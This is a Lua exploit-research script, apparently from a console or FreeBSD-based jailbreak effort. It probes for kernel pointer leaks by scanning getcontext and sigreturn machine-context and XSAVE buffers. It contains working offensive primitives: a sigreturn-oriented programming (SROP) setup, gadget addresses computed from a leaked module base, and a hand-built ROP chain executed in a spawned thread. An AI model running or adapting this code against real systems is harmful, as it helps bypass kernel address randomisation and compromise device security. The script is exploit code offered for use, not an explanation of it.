-- CRASH_CLASS: LOW
-- PROBE 142z: Full mcontext + FPU state scan for kernel pointer residue
-- After getcontext and after SROP, scan the ENTIRE mcontext+FPU area
-- (0x500+ bytes) for kernel addresses. Also try reading trapno/err/spare.

print("=== PROBE 142z: MCONTEXT SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)

print("--- [A] Getcontext full dump ---")

-- Allocate larger buffer for full context including FPU
local ctx = memory.alloc(0x800)
-- Fill with sentinel
for off = 0, 0x7FF, 4 do wd(ctx + off, 0xDEAD0000 + off) end

pcall(function() return sc_gc(uint64(ctx)) end)

-- Scan entire context for kernel pointers
local MC = 0x40  -- mcontext starts at offset 0x40
local found_kptr = false

-- Dump ALL non-zero qwords in the full context
for off = 0, 0x4FF, 8 do
    local q = safe_rq(ctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print("[A] *** KERNEL PTR at +" .. string.format("%03X", off) .. "=" .. hex(q) .. " ***")
            found_kptr = true
        elseif h ~= 0 and h ~= 0xDEAD0000 + off + 4 then
            -- Non-zero, non-sentinel high word
            print("[A] INTERESTING +" .. string.format("%03X", off) .. "=" .. hex(q))
        end
    end
end

if not found_kptr then
    print("[A] No kernel pointers in getcontext dump")
end

-- Print key fields
print("")
print("[A] Key mcontext fields:")
for _, f in ipairs({
    {0x40, "mc_onstack"}, {0x48, "mc_rdi"}, {0x50, "mc_rsi"},
    {0x58, "mc_rdx"}, {0x60, "mc_rcx"}, {0x68, "mc_r8"},
    {0x70, "mc_r9"}, {0x78, "mc_rax"}, {0x80, "mc_rbx"},
    {0x88, "mc_rbp"}, {0x90, "mc_r10"}, {0x98, "mc_r11"},
    {0xA0, "mc_r12"}, {0xA8, "mc_r13"}, {0xB0, "mc_r14"},
    {0xB8, "mc_r15"}, {0xC0, "mc_trapno"}, {0xC8, "mc_fs"},
    {0xD0, "mc_gs"}, {0xD8, "mc_addr"}, {0xE0, "mc_rip"},
    {0xE8, "mc_cs"}, {0xF0, "mc_rflags"}, {0xF8, "mc_rsp"},
    {0x100, "mc_ss"}, {0x108, "mc_len"}, {0x110, "mc_fpformat"},
    {0x118, "mc_ownedfp"}, {0x120, "mc_flags"},
    {0x128, "mc_fpstate[0]"}, {0x130, "mc_fpstate[1]"},
    {0x138, "mc_fpstate[2]"}, {0x140, "mc_fpstate[3]"},
    {0x148, "mc_fpstate[4]"}, {0x150, "mc_fpstate[5]"},
    {0x158, "mc_fpstate[6]"}, {0x160, "mc_fpstate[7]"},
}) do
    local q = safe_rq(ctx + f[1])
    if q then
        local h, l = get_hi_lo(q)
        if h ~= 0 or l ~= 0 then
            print("  " .. f[2] .. " (" .. string.format("+0x%03X", f[1]) .. ") = " .. hex(q))
        end
    end
end

--------------------------------------------------------------------
-- [B] Sigreturn with sentinels, then getcontext
--------------------------------------------------------------------
print("")
print("--- [B] Post-SROP context ---")

local srop_ctx = memory.alloc(0x800)
-- Fill with 0xCC sentinels
for off = 0, 0x7FF, 4 do wd(srop_ctx + off, 0xCCCCCCCC) end

-- Get a valid context first
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

-- Set up SROP: just do getpid (syscall 20)
wq(srop_ctx + MC + 0xA0, sc_addr)  -- rip = syscall
wq(srop_ctx + MC + 0x78, uint64(20))  -- rax = 20 (getpid)
-- Keep all other registers from getcontext

-- Do sigreturn
pcall(function() return sc_sr(uint64(srop_ctx)) end)

-- Now getcontext into a FRESH buffer
local post_ctx = memory.alloc(0x800)
for off = 0, 0x7FF, 4 do wd(post_ctx + off, 0xBBBBBBBB) end
pcall(function() return sc_gc(uint64(post_ctx)) end)

-- Scan for kernel pointers
found_kptr = false
for off = 0, 0x4FF, 8 do
    local q = safe_rq(post_ctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print("[B] *** KERNEL PTR at +" .. string.format("%03X", off) .. "=" .. hex(q) .. " ***")
            found_kptr = true
        end
    end
end
if not found_kptr then
    print("[B] No kernel pointers in post-SROP context")
end

--------------------------------------------------------------------
-- [C] Thread mcontext: check child thread's context after exit
--------------------------------------------------------------------
print("")
print("--- [C] Thread context ---")

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local einfo = memory.alloc(0x200)
wd(einfo, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(einfo)) end)
local elo = safe_rd(einfo + 0x108) or 0
local ehi = safe_rd(einfo + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))

-- Thread: getcontext into shared buffer, then exit
local shared_ctx = gpu + 0x10000
for off = 0, 0x7FF, 4 do wd(shared_ctx + off, 0xAAAAAAAA) end

local rop = gpu + 0x20000
local i = 0
-- getcontext(shared_ctx) — thread saves its own context
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, ua(shared_ctx)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(421)); i=i+8  -- getcontext
wq(rop + i, sc_addr); i=i+8
-- nanosleep 10ms
local ts10 = gpu + 0x1000
wq(ts10, uint64(0))
wq(ts10 + 8, uint64(10000000))
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, ua(ts10)); i=i+8
wq(rop + i, g_pop_rsi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(240)); i=i+8
wq(rop + i, sc_addr); i=i+8
-- thr_exit
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(431)); i=i+8
wq(rop + i, sc_addr); i=i+8

local tctx = gpu + 0x30000
for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
pcall(function() return sc_gc(uint64(tctx)) end)
wq(tctx + 0xE0, g_ret)
wq(tctx + 0xF8, ua(rop))

local tid_buf = gpu + 0x40000
wq(tid_buf, uint64(0))
local sc_thr_create = make_syscall(430)
pcall(function()
    return sc_thr_create(uint64(tctx), uint64(tid_buf), uint64(0))
end)
local tid_val = safe_rq(tid_buf)
local th, tl = get_hi_lo(tid_val)
print("[C] child tid=" .. tl)

-- Wait 100ms
local ts100 = memory.alloc(16)
wq(ts100, uint64(0))
wq(ts100 + 8, uint64(100000000))
pcall(function() make_syscall(240)(uint64(ts100), uint64(0)) end)

-- Scan child's saved context for kernel pointers
found_kptr = false
print("[C] Child context scan:")
for off = 0, 0x4FF, 8 do
    local q = safe_rq(shared_ctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print("[C] *** KERNEL PTR at +" .. string.format("%03X", off) .. "=" .. hex(q) .. " ***")
            found_kptr = true
        end
    end
end
if not found_kptr then
    print("[C] No kernel pointers in child context")
end

-- Check if trapno/addr/err have interesting values in child's context
local child_trapno = safe_rq(shared_ctx + 0xC0)
local child_addr = safe_rq(shared_ctx + 0xD8)
local child_err = safe_rq(shared_ctx + 0xC8)  -- fs contains err?
print("[C] trapno=" .. hex(child_trapno))
print("[C] addr=" .. hex(child_addr))

--------------------------------------------------------------------
-- [D] Multiple SROP: pump sigreturn and check for accumulating residue
--------------------------------------------------------------------
print("")
print("--- [D] SROP residue test ---")

-- Do 10 SROP calls, each time scan the post-call context
for round = 1, 5 do
    local rctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(rctx)) end)
    local rrip = memory.read_qword(rctx + MC + 0xA0)
    local rrh, rrl = get_hi_lo(rrip)
    local rsc = uint64(string.format("0x%X%08X", rrh, rrl - 2))

    wq(rctx + MC + 0xA0, rsc)
    wq(rctx + MC + 0x78, uint64(20))  -- getpid
    pcall(function() return sc_sr(uint64(rctx)) end)

    -- Re-read context
    pcall(function() return sc_gc(uint64(rctx)) end)

    -- Quick kernel pointer scan
    for off = 0, 0x4FF, 8 do
        local q = safe_rq(rctx + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 then
                print("[D] round " .. round .. " KERNEL PTR +" ..
                      string.format("%03X", off) .. "=" .. hex(q))
            end
        end
    end
end
print("[D] 5 rounds complete")

--------------------------------------------------------------------
-- [E] Read beyond mcontext: check for FPU/XSAVE kernel residue
--------------------------------------------------------------------
print("")
print("--- [E] Extended state scan ---")

-- Allocate a bigger buffer and scan the FPU area
local xctx = memory.alloc(0x1000)
for off = 0, 0xFFF, 4 do wd(xctx + off, 0x11111111) end
pcall(function() return sc_gc(uint64(xctx)) end)

-- XSAVE area starts at mcontext+0xE8 in some layouts, or mc_fpstate
-- FreeBSD amd64: mc_fpstate starts at offset 0x128 into mcontext
-- That's ctx + 0x40 + 0x128 = ctx + 0x168
-- XSAVE can be up to 2688 bytes (0xA80)

local xsave_start = 0x168
print("[E] XSAVE area from +" .. string.format("%03X", xsave_start))

for off = xsave_start, math.min(xsave_start + 0x500, 0xFFF), 8 do
    local q = safe_rq(xctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print("[E] *** XSAVE KERNEL PTR +" .. string.format("%03X", off) .. "=" .. hex(q) .. " ***")
        elseif h == 0x11111111 then
            -- Still sentinel — getcontext didn't touch this area
        elseif h ~= 0 and l ~= 0 then
            -- Non-zero, non-sentinel value in FPU state
            print("[E] FPU +" .. string.format("%03X", off) .. "=" .. hex(q))
        end
    end
end

print("")
print("=== DONE ===")
